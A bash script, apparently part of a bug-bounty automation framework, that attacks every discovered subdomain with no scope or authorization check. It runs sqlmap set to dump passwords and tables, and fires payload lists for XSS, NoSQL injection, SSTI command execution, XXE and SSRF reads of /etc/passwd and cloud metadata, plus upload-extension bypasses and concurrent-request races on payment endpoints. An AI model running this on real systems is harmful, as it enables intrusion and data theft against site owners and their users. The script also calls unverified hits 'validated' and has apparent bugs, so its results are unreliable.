#!/bin/bash
# Advanced Vulnerability Scanning Phase - Comprehensive Bug Hunting
# Integrates all bug hunting methodology techniques

vuln_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local vuln_dir="$output_dir/vuln"
    local live_file="$output_dir/live/live_subdomains.txt"
    local crawl_file="$output_dir/crawl/endpoints.txt"
    local params_file="$output_dir/crawl/urls_with_params.txt"
    local js_files="$output_dir/crawl/js_files.txt"

    mkdir -p "$vuln_dir"

    log "INFO" "Starting advanced vulnerability scanning for $domain"

    # ========================================================================
    # 1. NUCLEI - COMPREHENSIVE TEMPLATE SCANNING
    # ========================================================================
    if [ -f "$live_file" ] && tool_available "nuclei"; then
        log "INFO" "Running Nuclei with full template suite..."
        
        # Update templates first
        nuclei -update-templates 2>>"$LOGS_DIR/nuclei_update.log" || true
        
        # Critical/High severity first
        nuclei -l "$live_file" \
            -severity critical,high \
            -timeout 30 -retries 2 -rate-limit 150 \
            -o "$vuln_dir/nuclei_critical_high.txt" 2>>"$LOGS_DIR/nuclei.log" || true
        
        # Medium/Low/Info
        nuclei -l "$live_file" \
            -severity medium,low,info \
            -timeout 30 -retries 2 -rate-limit 100 \
            -o "$vuln_dir/nuclei_medium_low.txt" 2>>"$LOGS_DIR/nuclei.log" || true
        
        # Specific vulnerability classes
        for category in xss sqli ssrf rce lfi ssti idor auth-bypass cors csrf jwt graphql xxe redirect takeover; do
            nuclei -l "$live_file" \
                -tags "$category" \
                -timeout 20 -retries 1 -rate-limit 50 \
                -o "$vuln_dir/nuclei_${category}.txt" 2>>"$LOGS_DIR/nuclei.log" || true
        done
    fi

    # ========================================================================
    # 2. XSS TESTING - MULTIPLE ENGINES
    # ========================================================================
    if [ -f "$params_file" ]; then
        log "INFO" "Running advanced XSS testing..."
        
        # Dalfox - advanced XSS scanner
        if tool_available "dalfox"; then
            log "INFO" "Running Dalfox for XSS..."
            dalfox file "$params_file" \
                --blind "https://interactsh.com" \
                --waf-evasion \
                --skip-bav \
                --output "$vuln_dir/dalfox_xss.txt" \
                2>>"$LOGS_DIR/dalfox.log" || true
        fi
        
        # XSStrike - intelligent XSS
        if tool_available "xsstrike"; then
            log "INFO" "Running XSStrike for XSS..."
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                xsstrike -u "$url" \
                    --crawl \
                    --fuzzer \
                    --params \
                    --output "$vuln_dir/xsstrike_$(echo "$url" | md5sum | cut -d' ' -f1).txt" \
                    2>>"$LOGS_DIR/xsstrike.log" || true
            done < <(head -20 "$params_file")
        fi
        
        # Custom XSS payload testing
        log "INFO" "Testing custom XSS payloads..."
        cat > "$vuln_dir/xss_payloads.txt" << 'XSSPAYLOADS'
"><svg/onload=alert(1)>
'><svg/onload=alert(1)>
javascript:alert(1)
"><img src=x onerror=alert(1)>
"><body onload=alert(1)>
"><iframe src=javascript:alert(1)>
"><video><source onerror=alert(1)>
"><details open ontoggle=alert(1)>
"><svg><animate onbegin=alert(1)>
"><math><maction actiontype="statusline#http://example.com" xlink:href=#>CLICK
XSSPAYLOADS
        
        while IFS= read -r payload; do
            [ -z "$payload" ] && continue
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                # Test each parameter with XSS payload
                if [[ "$url" == *"?"* ]]; then
                    base="${url%\?*}"
                    params="${url#*\?}"
                    IFS='&' read -ra PARAMS <<< "$params"
                    for param in "${PARAMS[@]}"; do
                        key="${param%=*}"
                        test_url="${base}?${key}=$(printf '%s' "$payload" | jq -sRr @uri)"
                        curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$test_url" \
                            2>/dev/null | grep -q "200" && \
                            echo "XSS_CANDIDATE: $test_url | Payload: $payload" >> "$vuln_dir/custom_xss_hits.txt"
                    done
                fi
            done < <(head -50 "$params_file")
        done < "$vuln_dir/xss_payloads.txt"
    fi

    # ========================================================================
    # 3. SQL INJECTION - COMPREHENSIVE
    # ========================================================================
    if [ -f "$params_file" ] && tool_available "sqlmap"; then
        log "INFO" "Running SQLMap for SQL injection..."
        
        # Batch scan with optimized settings
        sqlmap -m "$params_file" \
            --batch \
            --level=3 \
            --risk=2 \
            --threads="$THREADS" \
            --timeout=30 \
            --retries=1 \
            --technique=BEUSTQ \
            --dbms=MySQL,PostgreSQL,SQLite,MSSQL,Oracle \
            --output-dir="$vuln_dir/sqlmap" \
            --banner \
            --current-db \
            --current-user \
            --is-dba \
            --users \
            --passwords \
            --tables \
            --columns \
            --dump \
            2>>"$LOGS_DIR/sqlmap.log" || true
    fi

    # NoSQL Injection testing
    if [ -f "$params_file" ]; then
        log "INFO" "Testing NoSQL injection..."
        cat > "$vuln_dir/nosql_payloads.txt" << 'NOSQLPAYLOADS'
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/.*/)"}
{"$or": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}
NOSQLPAYLOADS
        
        while IFS= read -r payload; do
            [ -z "$payload" ] && continue
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                if [[ "$url" == *"?"* ]]; then
                    test_url="${url}${payload}"
                    curl -s -o /dev/null -w "%{http_code}" -H "Content-Type: application/json" \
                        -d "$payload" --max-time 15 "$test_url" \
                        2>/dev/null | grep -q "200" && \
                        echo "NOSQL_CANDIDATE: $test_url | Payload: $payload" >> "$vuln_dir/nosql_hits.txt"
                fi
            done < <(head -30 "$params_file")
        done < "$vuln_dir/nosql_payloads.txt"
    fi

    # ========================================================================
    # 4. SSRF TESTING
    # ========================================================================
    if [ -f "$params_file" ]; then
        log "INFO" "Testing SSRF vulnerabilities..."
        
        cat > "$vuln_dir/ssrf_payloads.txt" << 'SSRFPAYLOADS'
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://localhost:8080
http://127.0.0.1:8080
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://[::1]:8080
http://2130706433
http://0177.0.0.1
http://internal.service.local
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
dict://localhost:11211/stat
gopher://127.0.0.1:6379/_INFO
ldap://localhost:389
SSRFPAYLOADS
        
        # Test URL/redirect parameters
        grep -iE "(url|uri|link|redirect|callback|webhook|endpoint|api|host|server|dns|domain|email|file|import|fetch|get|post|put|delete|patch)" "$params_file" \
            > "$vuln_dir/ssrf_target_params.txt" 2>/dev/null || true
        
        while IFS= read -r target_url; do
            [ -z "$target_url" ] && continue
            while IFS= read -r payload; do
                [ -z "$payload" ] && continue
                test_url=$(echo "$target_url" | sed "s|\(url\|uri\|link\|redirect\|callback\|webhook\|endpoint\|api\|host\|server\|dns\|domain\|email\|file\|import\|fetch\)=[^&]*|\1=$(printf '%s' "$payload" | jq -sRr @uri)|")
                response=$(curl -s -o /dev/null -w "%{http_code} %{time_total} %{size_download}" --max-time 15 "$test_url" 2>/dev/null)
                if echo "$response" | grep -q "^200"; then
                    echo "SSRF_HIT: $test_url | Payload: $payload | Response: $response" >> "$vuln_dir/ssrf_hits.txt"
                fi
            done < "$vuln_dir/ssrf_payloads.txt"
        done < <(head -50 "$vuln_dir/ssrf_target_params.txt")
    fi

    # ========================================================================
    # 5. SSTI (SERVER-SIDE TEMPLATE INJECTION)
    # ========================================================================
    if [ -f "$params_file" ] && tool_available "tplmap"; then
        log "INFO" "Running TPLMap for SSTI..."
        tplmap -m "$params_file" \
            --run-all \
            --threads="$THREADS" \
            --output-dir="$vuln_dir/tplmap" \
            2>>"$LOGS_DIR/tplmap.log" || true
    fi

    # Custom SSTI payload testing
    if [ -f "$params_file" ]; then
        log "INFO" "Testing custom SSTI payloads..."
        cat > "$vuln_dir/ssti_payloads.txt" << 'SSTIPAYLOADS'
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{self}}
{{request}}
{{''.__class__.__mro__[2].__subclasses__()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%= `id` %>
#{`id`}
SSTIPAYLOADS
        
        while IFS= read -r payload; do
            [ -z "$payload" ] && continue
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                if [[ "$url" == *"?"* ]]; then
                    test_url="${url}$(printf '%s' "$payload" | jq -sRr @uri)"
                    response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
                    if echo "$response" | grep -qE "(49|Runtime|ProcessBuilder|java.lang)"; then
                        echo "SSTI_HIT: $test_url | Payload: $payload" >> "$vuln_dir/ssti_hits.txt"
                    fi
                fi
            done < <(head -30 "$params_file")
        done < "$vuln_dir/ssti_payloads.txt"
    fi

    # ========================================================================
    # 6. AUTHENTICATION & AUTHORIZATION TESTING
    # ========================================================================
    if [ -f "$crawl_file" ]; then
        log "INFO" "Testing authentication and authorization flaws..."
        
        # JWT endpoints
        grep -iE "(jwt|token|auth|login|signin|oauth|sso|saml)" "$crawl_file" \
            > "$vuln_dir/auth_endpoints.txt" 2>/dev/null || true
        
        # IDOR/BOLA candidates
        grep -iE "(user_id|account_id|profile_id|customer_id|order_id|session_id|id=|/api/user|/api/account|/api/profile|/api/admin)" "$crawl_file" \
            > "$vuln_dir/idor_candidates.txt" 2>/dev/null || true
        
        # Mass assignment candidates
        grep -iE "(admin|role|is_admin|is_superuser|is_staff|is_verified|is_premium|role=|permission=|access_level=)" "$crawl_file" \
            > "$vuln_dir/mass_assignment_candidates.txt" 2>/dev/null || true
        
        # Test IDOR
        if [ -f "$vuln_dir/idor_candidates.txt" ]; then
            log "INFO" "Testing IDOR vulnerabilities..."
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                # Try to access with different IDs
                for test_id in "1" "2" "admin" "test" "../" "..%2F" "%2e%2e%2f"; do
                    test_url=$(echo "$url" | sed "s|\(id=\|user_id=\|account_id=\)[^&]*|\1$test_id|")
                    if [ "$test_url" != "$url" ]; then
                        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$test_url" 2>/dev/null)
                        if echo "$response" | grep -q "^200"; then
                            echo "IDOR_CANDIDATE: $test_url | Original: $url" >> "$vuln_dir/idor_hits.txt"
                        fi
                    fi
                done
            done < <(head -30 "$vuln_dir/idor_candidates.txt")
        fi
    fi

    # ========================================================================
    # 7. CORS & CROSS-ORIGIN TESTING
    # ========================================================================
    if [ -f "$live_file" ]; then
        log "INFO" "Testing CORS misconfigurations..."
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            # Test various origins
            for origin in "https://evil.com" "null" "https://$(echo $url | sed 's|https\?://||' | cut -d'/' -f1).evil.com" "https://sub.$(echo $url | sed 's|https\?://||' | cut -d'/' -f1)"; do
                response=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: $origin" \
                    -H "Access-Control-Request-Method: GET" -X OPTIONS --max-time 10 "$url" 2>/dev/null)
                acao=$(curl -s -o /dev/null -D - -H "Origin: $origin" --max-time 10 "$url" 2>/dev/null | grep -i "access-control-allow-origin" | cut -d' ' -f2- | tr -d '\r\n')
                if [ -n "$acao" ] && [ "$acao" != "null" ]; then
                    echo "CORS_HIT: $url | Origin: $origin | ACAO: $acao" >> "$vuln_dir/cors_hits.txt"
                fi
            done
        done < <(head -30 "$live_file")
    fi

    # ========================================================================
    # 8. RACE CONDITION TESTING
    # ========================================================================
    if [ -f "$params_file" ]; then
        log "INFO" "Testing race conditions..."
        grep -iE "(buy|purchase|checkout|payment|transfer|withdraw|refund|invite|vote|like|rate|apply|coupon|promo|gift|redeem)" "$params_file" \
            > "$vuln_dir/race_targets.txt" 2>/dev/null || true
        
        if [ -f "$vuln_dir/race_targets.txt" ]; then
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                log "DEBUG" "Testing race condition on: $url"
                # Fire 20 concurrent requests
                for i in {1..20}; do
                    curl -s -o /dev/null -w "%{http_code}\n" --max-time 5 "$url" 2>/dev/null &
                done
                wait
                echo "Race test completed for: $url" >> "$vuln_dir/race_results.txt"
            done < <(head -10 "$vuln_dir/race_targets.txt")
        fi
    fi

    # ========================================================================
    # 9. FILE UPLOAD TESTING
    # ========================================================================
    if [ -f "$crawl_file" ]; then
        log "INFO" "Testing file upload vulnerabilities..."
        grep -iE "(upload|file|image|document|attachment|media|asset)" "$crawl_file" \
            > "$vuln_dir/upload_endpoints.txt" 2>/dev/null || true
        
        if [ -f "$vuln_dir/upload_endpoints.txt" ]; then
            while IFS= read -r upload_url; do
                [ -z "$upload_url" ] && continue
                
                # Test various bypasses
                for ext in "php" "phtml" "php5" "php7" "pht" "asp" "aspx" "jsp" "jspx" "cfm" "cgi" "pl" "py" "rb" "sh"; do
                    for bypass in "" ".jpg" ".png" ".gif" "%00.jpg" "%00.png"; do
                        filename="test${bypass}.${ext}"
                        response=$(curl -s -o /dev/null -w "%{http_code}" -F "file=@/dev/null;filename=${filename}" --max-time 15 "$upload_url" 2>/dev/null)
                        if echo "$response" | grep -q "^2"; then
                            echo "UPLOAD_HIT: $upload_url | File: $filename | Response: $response" >> "$vuln_dir/upload_hits.txt"
                        fi
                    done
                done
                
                # Polyglot test
                response=$(curl -s -o /dev/null -w "%{http_code}" -F "file=@/dev/null;filename=polyglot.php.jpg" --max-time 15 "$upload_url" 2>/dev/null)
                if echo "$response" | grep -q "^2"; then
                    echo "UPLOAD_POLYGLOT: $upload_url" >> "$vuln_dir/upload_hits.txt"
                fi
            done < <(head -20 "$vuln_dir/upload_endpoints.txt")
        fi
    fi

    # ========================================================================
    # 10. GRAPHQL TESTING
    # ========================================================================
    if [ -f "$crawl_file" ]; then
        log "INFO" "Testing GraphQL vulnerabilities..."
        grep -iE "(graphql|gql)" "$crawl_file" > "$vuln_dir/graphql_endpoints.txt" 2>/dev/null || true
        
        if tool_available "gqlmap" && [ -f "$vuln_dir/graphql_endpoints.txt" ]; then
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                gqlmap -u "$url" --introspect --output "$vuln_dir/gqlmap_$(echo "$url" | md5sum | cut -d' ' -f1).txt" 2>>"$LOGS_DIR/gqlmap.log" || true
            done < "$vuln_dir/graphql_endpoints.txt"
        fi
    fi

    # ========================================================================
    # 11. XXE TESTING
    # ========================================================================
    if [ -f "$params_file" ]; then
        log "INFO" "Testing XXE vulnerabilities..."
        cat > "$vuln_dir/xxe_payloads.xml" << 'XXEPAYLOAD'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
XXEPAYLOAD
        
        # Test XML endpoints
        grep -iE "(\.xml|content-type.*xml|application/xml|text/xml)" "$params_file" "$crawl_file" 2>/dev/null \
            | sort -u > "$vuln_dir/xml_endpoints.txt" || true
        
        if [ -f "$vuln_dir/xml_endpoints.txt" ]; then
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                response=$(curl -s -o /dev/null -w "%{http_code}" -H "Content-Type: application/xml" \
                    -d @"$vuln_dir/xxe_payloads.xml" --max-time 15 "$url" 2>/dev/null)
                if echo "$response" | grep -q "^2"; then
                    content=$(curl -s -H "Content-Type: application/xml" -d @"$vuln_dir/xxe_payloads.xml" --max-time 15 "$url" 2>/dev/null)
                    if echo "$content" | grep -q "root:"; then
                        echo "XXE_HIT: $url" >> "$vuln_dir/xxe_hits.txt"
                    fi
                fi
            done < "$vuln_dir/xml_endpoints.txt"
        fi
    fi

    # ========================================================================
    # 12. OPEN REDIRECT TESTING
    # ========================================================================
    if [ -f "$params_file" ]; then
        log "INFO" "Testing open redirects..."
        grep -iE "(redirect|url|uri|link|next|return|continue|dest|destination|goto|forward)" "$params_file" \
            > "$vuln_dir/redirect_params.txt" 2>/dev/null || true
        
        cat > "$vuln_dir/redirect_payloads.txt" << 'REDIRECTPAYLOADS'
https://evil.com
//evil.com
/\evil.com
https://evil.com%2f%2e%2e
https://evil.com@target.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
REDIRECTPAYLOADS
        
        while IFS= read -r target; do
            [ -z "$target" ] && continue
            while IFS= read -r payload; do
                [ -z "$payload" ] && continue
                test_url=$(echo "$target" | sed "s|\(redirect\|url\|uri\|link\|next\|return\|continue\|dest\|destination\|goto\|forward\)=[^&]*|\1=$(printf '%s' "$payload" | jq -sRr @uri)|")
                response=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" --max-time 10 "$test_url" 2>/dev/null)
                if echo "$response" | grep -qE "^3[0-9]{2}.*evil\.com"; then
                    echo "REDIRECT_HIT: $test_url | Payload: $payload | Response: $response" >> "$vuln_dir/redirect_hits.txt"
                fi
            done < "$vuln_dir/redirect_payloads.txt"
        done < <(head -30 "$vuln_dir/redirect_params.txt")
    fi

    # ========================================================================
    # 13. SUBDOMAIN TAKEOVER CHECK
    # ========================================================================
    if [ -f "$output_dir/subdomains/subdomains.txt" ] && tool_available "subzy"; then
        log "INFO" "Checking subdomain takeover..."
        subzy -targets "$output_dir/subdomains/subdomains.txt" \
            -verify_ssl -timeout 30 \
            -output "$vuln_dir/subdomain_takeover.txt" 2>>"$LOGS_DIR/subzy.log" || true
    fi

    # ========================================================================
    # 15. LIBRARY VULNERABILITY SCANNING (CVE/ExploitDB/GitHub)
    # ========================================================================
    log "INFO" "Scanning detected libraries for known vulnerabilities..."
    
    if [ -f "$output_dir/js_analysis/libraries_summary.txt" ] && [ -s "$output_dir/js_analysis/libraries_summary.txt" ]; then
        source "$SCRIPT_DIR/../scripts/exploitdb_cve.sh"
        scan_libraries_for_vulns "$domain" &
        LIB_VULN_PID=$!
    fi

    # ========================================================================
    # 16. AGGREGATE & VALIDATE ALL FINDINGS
    # ========================================================================
    log "INFO" "Aggregating and validating all findings..."
    
    # Wait for library vuln scan if running
    if [ -n "${LIB_VULN_PID:-}" ]; then
        wait $LIB_VULN_PID 2>/dev/null || true
    fi

    # Combine all vulnerability files
    cat "$vuln_dir"/*.txt 2>/dev/null | grep -v "^$" | sort -u > "$vuln_dir/all_vulnerabilities_raw.txt" 2>/dev/null || true
    
    # Create structured JSON output with validation
    python3 << 'PYEOF' "$domain" "$output_dir" "$vuln_dir" 2>/dev/null || true
import json, os, sys, re, hashlib
from datetime import datetime

domain = sys.argv[1]
output_dir = sys.argv[2]
vuln_dir = sys.argv[3]

findings = []

# Parse all text files in vuln_dir
for filename in os.listdir(vuln_dir):
    if not filename.endswith('.txt') or filename in ['all_vulnerabilities_raw.txt', 'all_vulnerabilities.json']:
        continue
    filepath = os.path.join(vuln_dir, filename)
    vuln_type = filename.replace('.txt', '').replace('nuclei_', '').replace('_', '-')
    
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                # Generate content hash for deduplication
                content_hash = hashlib.md5(line.encode()).hexdigest()[:12]
                
                finding = {
                    'id': content_hash,
                    'type': vuln_type,
                    'raw': line,
                    'domain': domain,
                    'timestamp': datetime.utcnow().isoformat() + 'Z',
                    'source_tool': filename.split('_')[0] if '_' in filename else 'manual',
                    'verified': False,
                    'severity': 'unknown',
                    'confidence': 0.5
                }
                
                # Classify severity based on type
                if any(kw in vuln_type for kw in ['rce', 'sqli', 'ssti', 'xxe', 'ssrf', 'idor', 'auth-bypass']):
                    finding['severity'] = 'critical'
                    finding['confidence'] = 0.8
                elif any(kw in vuln_type for kw in ['xss', 'nosql', 'graphql', 'lfi', 'rfi']):
                    finding['severity'] = 'high'
                    finding['confidence'] = 0.7
                elif any(kw in vuln_type for kw in ['cors', 'redirect', 'open-redirect', 'jwt', 'saml']):
                    finding['severity'] = 'medium'
                    finding['confidence'] = 0.6
                elif any(kw in vuln_type for kw in ['info', 'disclosure', 'headers', 'ssl', 'tls']):
                    finding['severity'] = 'low'
                    finding['confidence'] = 0.5
                
                findings.append(finding)
    except Exception as e:
        pass

# Deduplicate by content hash
seen = set()
unique_findings = []
for f in findings:
    if f['id'] not in seen:
        seen.add(f['id'])
        unique_findings.append(f)

# Sort by severity
severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'unknown': 4}
unique_findings.sort(key=lambda x: severity_order.get(x['severity'], 4))

# Write structured output
output = {
    'domain': domain,
    'scan_timestamp': datetime.utcnow().isoformat() + 'Z',
    'total_findings': len(unique_findings),
    'severity_counts': {},
    'findings': unique_findings
}

for f in unique_findings:
    sev = f['severity']
    output['severity_counts'][sev] = output['severity_counts'].get(sev, 0) + 1

with open(os.path.join(vuln_dir, 'all_vulnerabilities.json'), 'w') as f:
    json.dump(output, f, indent=2)

# Also create summary text file
with open(os.path.join(vuln_dir, 'all_vulnerabilities.txt'), 'w') as f:
    for finding in unique_findings:
        f.write(f"[{finding['severity'].upper()}] {finding['type']}: {finding['raw']}\n")

print(f"Processed {len(findings)} raw findings -> {len(unique_findings)} unique")
PYEOF

    local vuln_count
    vuln_count=$(cat "$vuln_dir/all_vulnerabilities.json" 2>/dev/null | python3 -c "import sys, json; print(json.load(sys.stdin).get('total_findings', 0))" 2>/dev/null || echo 0)
    
    phase_log "INFO" "Advanced vulnerability scanning complete: $vuln_count validated vulnerabilities found" "vuln" "$domain"

    # Write findings from the aggregated JSON
    if [ -f "$vuln_dir/all_vulnerabilities.json" ]; then
        while IFS= read -r finding; do
            [ -z "$finding" ] && continue
            local severity=$(echo "$finding" | jq -r '.severity // "unknown"' 2>/dev/null)
            local vuln_type=$(echo "$finding" | jq -r '.type // "unknown"' 2>/dev/null)
            local raw=$(echo "$finding" | jq -r '.raw // ""' 2>/dev/null | head -c 500)
            
            write_finding "{\"type\":\"$vuln_type\",\"severity\":\"$severity\",\"details\":\"$raw\",\"phase\":\"vuln\"}" \
                "$vuln_dir/findings.jsonl" 2>/dev/null || true
        done < <(jq -c '.findings[]' "$vuln_dir/all_vulnerabilities.json" 2>/dev/null)
    fi

    echo "$vuln_count" > "$vuln_dir/count.txt"

    py_log "INFO" "vuln_phase" "Completed for $domain"
}

export -f vuln_phase